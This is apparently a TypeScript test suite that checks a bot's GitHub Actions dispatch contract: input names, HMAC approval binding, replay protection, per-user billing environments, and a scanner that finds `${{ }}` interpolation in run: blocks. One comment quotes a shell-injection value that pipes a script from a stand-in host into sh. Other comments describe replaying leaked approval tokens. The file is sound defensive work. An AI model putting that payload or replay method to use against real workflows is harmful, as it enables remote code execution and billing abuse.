/**
 * THE BOT/WORKFLOW CONTRACT.
 *
 * The dispatch inputs are a wire format shared between two things that never import each other:
 * this TypeScript module, and `.github/workflows/agent-implement-request.yml`, which re-validates
 * every field and refuses the dispatch on any mismatch.
 *
 * They drifted apart once already, in five separate ways at the same time, and every one of them
 * was invisible to the type system and to every other test:
 *
 *   1. the bot sent `approval_id`; the workflow required `approval_token`
 *   2. the bot never sent `request_id`, which the workflow requires and length-checks
 *   3. nothing computed the approval MAC at all
 *   4. the bot's `run-name` correlation token was `build-<approvalId>`, while the workflow
 *      stamps the REQUEST id into its run name - so the blind-dispatch fallback could never match
 *   5. the PR was looked up on `bot/issue-<n>` while the branch dispatched was `agent/req-<id>`,
 *      so the build would succeed, the PR would exist, and the link would never arrive
 *
 * (1) and (2) fail loudly on the first dispatch. (4) and (5) do not fail at all - they just
 * silently never deliver, which is the worst outcome this product has.
 *
 * So this file reads the workflow as TEXT and asserts the two sides still agree. It needs no YAML
 * parser and no network, and it fails the moment somebody edits one side alone.
 */

import { strict as assert } from 'node:assert';
import { readFileSync } from 'node:fs';
import { test } from 'node:test';

import { SHARED_BUILD_ENVIRONMENT, agentBranchName, buildEnvironmentName, isBuildEnvironmentName } from '#core/text';

const WORKFLOW_PATH = '.github/workflows/agent-implement-request.yml';
const MODULE_PATH = 'src/modules/builder/module.ts';
const VERIFIER_PATH = '.github/scripts/verify_approval.py';

const workflow = readFileSync(WORKFLOW_PATH, 'utf8');
const moduleSource = readFileSync(MODULE_PATH, 'utf8');
const verifier = readFileSync(VERIFIER_PATH, 'utf8');

/** Every input the bot sends, and which the workflow must therefore declare. */
const DISPATCH_INPUTS = ['request_id', 'issue_number', 'branch', 'approval_token', 'approval_id', 'approval_issued_at', 'environment_name'] as const;

test('the workflow declares every input the builder sends', () => {
  for (const name of DISPATCH_INPUTS) {
    assert.match(
      workflow,
      new RegExp(`^\\s{6}${name}:$`, 'mu'),
      `the workflow must declare a "${name}" input because the builder sends one`,
    );
  }
});

test('the builder sends every input the workflow marks required', () => {
  // Pull each declared input plus whether it is required, straight out of the YAML text.
  const declared = [...workflow.matchAll(/^ {6}([a-z_]+):$\n(?: {8}.*$\n)*?/gmu)].map((m) => m[1]);
  const required = declared.filter((name) => {
    const block = workflow.slice(workflow.indexOf(`      ${name}:`));
    const nextBlank = block.search(/\n {6}\w|\n\n/u);
    return /required:\s*true/u.test(block.slice(0, nextBlank === -1 ? block.length : nextBlank));
  });

  assert.ok(required.length > 0, 'sanity: the parse should find some required inputs');
  for (const name of required) {
    if (name === 'base_branch') continue; // optional, has a workflow-side default
    assert.ok(
      moduleSource.includes(`${name}:`),
      `the workflow requires input "${name}" but the builder never sends it`,
    );
  }
});

test('the branch the bot builds is the branch the workflow will accept', () => {
  const requestId = '01JBXR4T9K2M8N7P6Q5R4S3T2V';

  // The workflow asserts equality against this exact shell expansion.
  assert.match(
    workflow,
    /\[ "\$BRANCH" = "agent\/req-\$\{REQUEST_ID\}" \]/u,
    'the workflow must pin the branch to agent/req-<REQUEST_ID>',
  );
  assert.equal(
    agentBranchName(requestId),
    `agent/req-${requestId}`,
    'and the bot must build exactly that string',
  );
});

test('the PR is looked up on the same branch that was dispatched', () => {
  // The failure this prevents is silent: the build succeeds, the PR exists, no link arrives.
  assert.ok(
    moduleSource.includes('findPrForBranch(agentBranchName('),
    'findPrForBranch must derive its branch from agentBranchName, not a second literal',
  );
  assert.ok(
    !/findPrForBranch\(`bot\/issue-/u.test(moduleSource),
    'the old bot/issue- lookup must not come back',
  );
});

test('the run-name correlation token is one the workflow actually stamps', () => {
  // Blind dispatch (HTTP 204) correlates by substring match on the run name, so the token the
  // bot searches for has to be present in what the workflow sets.
  assert.match(
    workflow,
    /^run-name:.*\$\{\{ inputs\.request_id \}\}/mu,
    'run-name must carry the request id',
  );
  assert.ok(
    moduleSource.includes('actionsToken.ulid(p.value.id)'),
    'the bot must correlate on the request id, not on some other identifier',
  );
});

test('the approval MAC is computed over the body GitHub returns, not the body we sent', () => {
  // If this regresses, every dispatch is rejected by the workflow gate the first time GitHub
  // normalises anything in the body.
  assert.ok(
    // Through the request's OWN repository's issues port (RFC-001 PR 2.1), resolved once per pass.
    moduleSource.includes('gh.issues.bodySha256('),
    'the digest must be read back from GitHub before signing',
  );
});

// ---------------------------------------------------------------------------------------
// environment_name — the input that decides who pays
// ---------------------------------------------------------------------------------------

test('the job selects its environment from the input, not from a hard-coded name', () => {
  // Before this, every build ran in `ai-agent` and the operator paid for all of them. If this
  // regresses to a literal, bring-your-own-credentials silently stops working: the user's key
  // is written to their environment, never read, and the operator's bill quietly resumes.
  assert.match(
    workflow,
    /^ {4}environment: \$\{\{ inputs\.environment_name \}\}$/mu,
    'the job must use `environment: ${{ inputs.environment_name }}`',
  );
  assert.ok(
    !/^ {4}environment: ai-agent$/mu.test(workflow),
    'the hard-coded `environment: ai-agent` must be gone, or the per-user selection is dead code',
  );
});

test('the workflow re-validates environment_name against the same shape the bot can build', () => {
  // The workflow is the side that does not trust the bot. Its check is written in shell, so it
  // cannot import `isBuildEnvironmentName` — this asserts the two definitions still describe the
  // same set, by running every name the bot can produce past the workflow's own rules.
  assert.match(workflow, /case "\$ENVIRONMENT_NAME" in/u, 'environment_name must be shape-checked');
  assert.match(workflow, /^\s*ai-agent\)$/mu, 'the shared environment must be accepted by name');
  assert.match(workflow, /USER_ID="\$\{ENVIRONMENT_NAME#user-\}"/u, 'per-user names must be split on the user- prefix');
  assert.match(workflow, /case "\$USER_ID" in ''\|\*\[!0-9\]\*\)/u, 'the user id must be digits only');
  assert.match(workflow, /-lt 17 \] \|\| \[ \$\{#USER_ID\} -gt 20 \]/u, 'and 17..20 of them, i.e. a snowflake');

  // The names the bot really produces, proven legal by the rules asserted above.
  assert.equal(buildEnvironmentName(null), SHARED_BUILD_ENVIRONMENT);
  assert.equal(buildEnvironmentName('111111111111111111'), 'user-111111111111111111');
  for (const name of [SHARED_BUILD_ENVIRONMENT, 'user-111111111111111111', 'user-12345678901234567890']) {
    assert.ok(isBuildEnvironmentName(name), `${name} must be a name both sides accept`);
  }
  for (const name of ['', 'user-', 'user-abc', 'ai-agent2', 'user-1234567890123456', 'user-111111111111111111/x']) {
    assert.ok(!isBuildEnvironmentName(name), `${name} must be refused`);
  }
});

test('environment_name is validated BEFORE anything else in the validate step', () => {
  // It decides who pays, so it is checked first — and, more practically, a run that got the
  // wrong environment must not first spend a `gh` call proving the issue number is a number.
  const step = workflow.slice(workflow.indexOf('- name: Validate dispatch inputs'));
  const body = step.slice(0, step.indexOf('- name: Checkout'));
  assert.ok(
    body.indexOf('$ENVIRONMENT_NAME') < body.indexOf('$REQUEST_ID'),
    'the environment_name check must come first in the validate step',
  );
});

test('the approval MAC binds environment_name on BOTH sides', () => {
  // THE BILLING BINDING. Dispatch inputs are printed in the run title, the REST API and the job
  // log, so anyone who can dispatch can read a valid approval token and re-point it at somebody
  // else's environment. Only the MAC stops that, and only if both halves sign the same tuple.
  assert.ok(
    moduleSource.includes('environmentName,'),
    'the builder must pass environmentName into signApproval',
  );
  assert.match(
    verifier,
    /f"v2\.\{request_id\}\.\{approval_id\}\.\{issue_number\}\.\{body_sha\}"\s*f"\.\{environment_name\}\.\{approval_issued_at\}\.\{repository\}"/u,
    'the Python verifier must cover the environment name, in that position of the v2 tuple',
  );
  assert.match(
    verifier,
    /environment_name = os\.environ\["ENVIRONMENT_NAME"\]/u,
    'and must read it from the environment rather than defaulting it',
  );
  assert.match(
    workflow,
    /^\s+ENVIRONMENT_NAME: \$\{\{ inputs\.environment_name \}\}$/mu,
    'the verify step must pass ENVIRONMENT_NAME through to the verifier',
  );
});

// ---------------------------------------------------------------------------------------
// THE REPLAY BINDING. The token is printed in plaintext in the run log, so without these it is
// a non-expiring bearer credential: copy it out of a finished run, dispatch again, repeat until
// the daily cap. Both halves have to agree on the id, the time, and the consume step.
// ---------------------------------------------------------------------------------------

test('the approval MAC binds approval_id and approval_issued_at on BOTH sides', () => {
  assert.ok(moduleSource.includes('approvalId: approvalId.value,'), 'the builder must sign the persisted approval id');
  assert.ok(moduleSource.includes('issuedAtSec,'), 'and the issue time it stamps on the row');
  assert.ok(
    moduleSource.includes('approval_id: actionsToken.uuid(approvalId.value)') && moduleSource.includes('approval_issued_at: issuedAtSec'),
    'and dispatch the SAME two values as inputs',
  );
  for (const name of ['APPROVAL_ID', 'APPROVAL_ISSUED_AT', 'REPO', 'RUN_CREATED_AT'] as const) {
    assert.match(verifier, new RegExp(`os\\.environ\\["${name}"\\]`, 'u'), `the verifier must read ${name} rather than default it`);
  }
  assert.match(workflow, /^\s+APPROVAL_ID: \$\{\{ inputs\.approval_id \}\}$/mu, 'the verify step passes APPROVAL_ID through env:');
  assert.match(workflow, /^\s+APPROVAL_ISSUED_AT: \$\{\{ inputs\.approval_issued_at \}\}$/mu, 'and APPROVAL_ISSUED_AT');
});

test('the issue time is signed from the same instant the row remembers, in seconds', () => {
  // The verifier compares `approval_issued_at` to the run's `created_at` in Unix seconds. The
  // bot reads the clock ONCE, signs the floor of it in seconds, and stamps the row with the
  // millisecond value through `countDispatchAttempt`; two clock reads here would be two numbers.
  assert.ok(moduleSource.includes('const issuedAtMs = jctx.ports.clock.now();'), 'one clock read');
  assert.ok(moduleSource.includes('const issuedAtSec = Math.floor(issuedAtMs / 1000);'), 'floored to seconds for the wire');
  assert.ok(moduleSource.includes('repo.countDispatchAttempt(p.value.id, issuedAtMs);'), 'and the row is stamped with the same instant');
});

test('the verify step measures age against the run\'s creation time, converted and digit-checked', () => {
  const verify = workflow.slice(workflow.indexOf('- name: Verify the Discord approval'), workflow.indexOf('- name: Consume the approval'));
  assert.match(verify, /gh run view "\$RUN_ID" --repo "\$REPO" --json createdAt \| jq -r '\.createdAt \| fromdateiso8601'/u, 'ISO-8601 from gh, converted by jq');
  assert.match(verify, /case "\$RUN_CREATED_AT" in ''\|\*\[!0-9\]\*\)/u, 'and digit-checked before the verifier sees it');
  assert.ok(verify.indexOf('case "$RUN_CREATED_AT"') < verify.indexOf('python3 .github/scripts/verify_approval.py'), 'checked BEFORE the verifier runs');
  assert.match(verify, /APPROVAL_MAX_AGE_SECONDS: \$\{\{ vars\.APPROVAL_MAX_AGE_SECONDS \|\| '900' \}\}/u, 'the limit is an operator variable defaulting to 900');
  assert.match(verifier, /DEFAULT_MAX_AGE_SECONDS = 900/u, 'and the verifier agrees on the default');
});

test('the consume step exists, runs after the MAC and before any spend, and fails closed', () => {
  const consume = stepAt('Consume the approval');
  assert.ok(consume > 0, 'there must be a consume step');
  assert.ok(consume > stepAt('Verify the Discord approval'), 'after the MAC, so an unapproved dispatch cannot burn an id or learn whether one was seen');
  assert.ok(consume < stepAt('Check the build credentials exist'), 'before the credential check');
  assert.ok(consume < stepAt('Enforce daily agent-run cap'), 'before the cap');
  assert.ok(consume < workflow.indexOf('uses: actions/setup-node@'), 'before the toolchain, so a replay installs nothing');

  const body = workflow.slice(consume, stepAt('Check the build credentials exist'));
  // Both checks, in this order: the run-list scan the agent cannot undo, THEN the atomic ref.
  const scan = body.indexOf('gh run list');
  const ref = body.indexOf('refs/approvals/');
  assert.ok(scan > 0 && ref > 0 && scan < ref, 'the run-list scan must run before the refs/approvals/ POST');
  assert.match(body, /--arg needle "approval \$APPROVAL_ID"/u, 'the scan is keyed on the approval id as the run name spells it');
  assert.match(body, /case "\$PRIOR" in ''\|\*\[!0-9\]\*\) echo "::error::could not list earlier runs/u, 'an unparsable scan answer refuses rather than passes');
  assert.match(body, /Reference already exists/u, 'and GitHub\'s 422 on an existing ref is read as a replay');
  for (const name of ['GH_TOKEN', 'REPO', 'APPROVAL_ID', 'BASE_SHA', 'RUN_ID']) {
    assert.match(body, new RegExp(`^\\s+${name}: \\$\\{\\{ `, 'mu'), `the consume step declares ${name} in its env: block`);
  }
  assert.ok(!/\$\{\{ inputs\.approval_id \}\}[^\n]*\n[^\n]*run:/u.test(body.replace(/env:[\s\S]*?run:/u, 'run:')), 'APPROVAL_ID reaches the shell through env:, never inline');
});

test('the run name carries the approval id, which is what both replay checks key on', () => {
  assert.match(workflow, /^run-name:.*approval \$\{\{ inputs\.approval_id \}\}/mu, 'run-name must end with "approval <id>"');
  // The bot adopts the earlier run of a replayed approval by this same token.
  assert.ok(moduleSource.includes("failedStep === 'approval_replayed'"), 'the bot must recognise the replay report');
  assert.ok(moduleSource.includes('findRunByName(actionsToken.uuid(earlierId.value), since, row.runId)'), 'and search by the approval id, excluding the refused run');
});

test('the run report distinguishes expired and replayed approvals from a plain MAC failure', () => {
  const report = workflow.slice(stepAt('Post the run report'));
  assert.match(report, /APPROVAL_REASON: \$\{\{ steps\.approval\.outputs\.reason \}\}/u);
  assert.match(report, /CONSUME: \$\{\{ steps\.consume\.outcome \}\}/u);
  assert.match(report, /\[ "\$\{APPROVAL_REASON:-\}" = expired \]; then FAILED='"approval_expired"'/u);
  assert.match(report, /\[ "\$CONSUME" = failure \];\s+then FAILED='"approval_replayed"'/u);
  assert.match(verifier, /note_reason\("expired"\)/u, 'the verifier writes the reason the report reads');
});

function stepAt(name: string): number {
  return workflow.indexOf(`- name: ${name}`);
}

test('the environment the bot signs is the environment the bot dispatches', () => {
  // Signing one string and sending another is rejected on every attempt, and it reads like a
  // tampered issue body rather than like a bug in this file. Both must derive from the one
  // function that builds the name.
  assert.ok(
    moduleSource.includes('const environmentName = buildEnvironmentName(payer.value)'),
    'the signed name must come from buildEnvironmentName',
  );
  assert.ok(
    moduleSource.includes('environment_name: actionsToken.buildEnvironment(payer.value)'),
    'and the dispatched name must be built from the same payer, through the same helper',
  );
});

test('the workflow can pay with either credential, and says so before spending', () => {
  // The user supplies ONE of the two. The workflow must pass both and let whichever exists
  // resolve — a branch on which kind it is would require the bot to have looked at the value.
  assert.match(workflow, /anthropic_api_key: \$\{\{ secrets\.ANTHROPIC_API_KEY \}\}/u);
  assert.match(workflow, /claude_code_oauth_token: \$\{\{ secrets\.CLAUDE_CODE_OAUTH_TOKEN \}\}/u);

  // And it fails fast when the selected environment holds neither, rather than 30 minutes later
  // inside the agent step.
  const check = workflow.indexOf('- name: Check the build credentials exist');
  assert.ok(check > 0, 'there must be a pre-flight credential check in the workflow');
  assert.ok(
    check > workflow.indexOf('- name: Verify the Discord approval'),
    'it must run AFTER the approval gate, or it is an oracle for who has credentials configured',
  );
  assert.ok(
    check < workflow.indexOf('- name: Implement with Claude Code'),
    'and before any Anthropic spend',
  );
});

test('APPROVAL_HMAC_KEY is documented as a repository secret, not an environment secret', () => {
  // The trap this closes: the key used to live in the `ai-agent` environment. Now that the job
  // runs in `user-<id>` for anyone with their own credentials, an environment-scoped key is
  // EMPTY in exactly those runs, and the approval gate rejects them all with a key-length error
  // that names nothing relevant.
  assert.match(
    verifier,
    /APPROVAL_HMAC_KEY must be a REPOSITORY secret/u,
    'the verifier must say where the key has to live, because the failure mode is opaque',
  );
});

test('no untrusted value can reach the workflow as a bare string', () => {
  // SC-1. ActionsInput excludes plain strings, so this is really a guard against someone
  // widening that type later and quietly reopening shell interpolation.
  assert.ok(
    !/inputs:\s*\{[^}]*:\s*`/su.test(moduleSource.slice(moduleSource.indexOf('builds.dispatch('))),
    'dispatch inputs must be ActionsTokens or numbers, never template strings',
  );
});

// ---------------------------------------------------------------------------------------
// Script injection — the rule the workflow's own header states, made true
// ---------------------------------------------------------------------------------------

/**
 * Every `run:` script in the workflow, with the step name that owns it.
 *
 * A block scalar (`run: |`) runs until the indentation drops back to the key's level, so that
 * is what bounds each script. Single-line `run:` forms are captured too, because the rule has
 * nothing to do with which YAML style someone chose.
 */
function runBlocks(yaml: string): readonly { readonly step: string; readonly script: string }[] {
  const lines = yaml.split('\n');
  const out: { step: string; script: string }[] = [];
  let step = '<unnamed step>';

  for (let i = 0; i < lines.length; i += 1) {
    const line = lines[i] ?? '';
    const named = /^\s*- name:\s*(.+)$/u.exec(line);
    if (named) step = (named[1] ?? '').trim();

    const block = /^(\s*)run:\s*[|>][-+]?\s*$/u.exec(line);
    if (block) {
      const indent = (block[1] ?? '').length;
      const body: string[] = [];
      for (let j = i + 1; j < lines.length; j += 1) {
        const next = lines[j] ?? '';
        if (next.trim() !== '' && next.search(/\S/u) <= indent) break;
        body.push(next);
      }
      out.push({ step, script: body.join('\n') });
      continue;
    }

    const inline = /^\s*run:\s*(\S.*)$/u.exec(line);
    if (inline) out.push({ step, script: inline[1] ?? '' });
  }
  return out;
}

test('the workflow file has LF line endings, because CRLF breaks the runner', () => {
  // `.gitattributes` calls this correctness, not style: a `\r` at the end of a line inside a
  // `run:` block reaches bash as part of the command, and the step dies with
  // `$'\r': command not found`. It is asserted here as well because every check in this file
  // matches the workflow as TEXT — a CRLF file fails several of them at once, with messages
  // about missing inputs rather than about line endings. I hit exactly that while testing this
  // suite against a deliberately broken workflow, and spent the confusion so nobody else has to.
  assert.ok(!workflow.includes('\r'), 'the workflow must use LF line endings');
  assert.ok(!verifier.includes('\r'), 'and so must the verifier it calls');
});

test('the run-block scanner actually finds the scripts it is supposed to police', () => {
  // A scanner that silently matches nothing is worse than no scanner: it reports success
  // forever. This pins it to the steps that really exist.
  const blocks = runBlocks(workflow);
  assert.ok(blocks.length >= 6, `expected several run blocks, found ${blocks.length}`);
  assert.ok(
    blocks.some((b) => b.step === 'Validate dispatch inputs' && b.script.includes('$ENVIRONMENT_NAME')),
    'the validate step and its body must be among what the scanner returns',
  );

  // And it must be able to SEE an offence, or the assertion below proves nothing.
  const planted = runBlocks(['      - name: Bad\n        run: |\n          echo ${{ inputs.request_id }}'].join(''));
  assert.ok(planted[0]?.script.includes('${{'), 'the scanner must catch an interpolation it is shown');
});

test('no `${{ }}` expression appears inside any run: block', () => {
  // THE SCRIPT-INJECTION RULE, which the workflow header states in prose. A `${{ }}` inside a
  // `run:` body is substituted TEXTUALLY before the shell parses the script, so a value
  // containing `"; curl evil.sh | sh; #` executes. Every value must arrive through `env:` and
  // be read as "$VAR", which the shell treats as data.
  //
  // `environment_name` is why this is asserted rather than assumed: it is new, it is
  // attacker-visible, and the obvious way to log it is `echo "${{ inputs.environment_name }}"`.
  for (const { step, script } of runBlocks(workflow)) {
    assert.ok(
      !script.includes('${{'),
      `the "${step}" step interpolates a \${{ }} expression into its script. Pass it through env: and read it as "$VAR" instead.`,
    );
  }
});
